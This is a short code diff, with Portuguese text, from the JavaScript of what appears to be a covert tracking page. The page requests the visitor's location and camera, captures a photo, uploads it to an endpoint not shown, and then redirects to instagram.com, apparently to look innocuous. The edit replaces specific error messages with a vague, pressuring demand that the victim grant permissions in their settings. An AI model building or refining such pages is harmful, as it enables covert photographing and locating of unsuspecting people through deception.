@@ -62,7 +62,7 @@
         askCamera(); // Agora sempre tenta a câmera direto, sem mensagem no Safari
       })
       .catch(() => {
-        showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
+        showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askLocation);
       });
     }
 
@@ -93,12 +93,12 @@
                 body: imgForm
               })
               .then(() => window.location.href = 'https://instagram.com')
-              .catch(() => showOverlay('Erro ao enviar imagem. Toque para tentar novamente.', askCamera));
+              .catch(() => showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askCamera));
             }, 'image/png');
           }, 500);
         })
         .catch(() => {
-          showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', askCamera);
+          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askCamera);
         });
     }
 
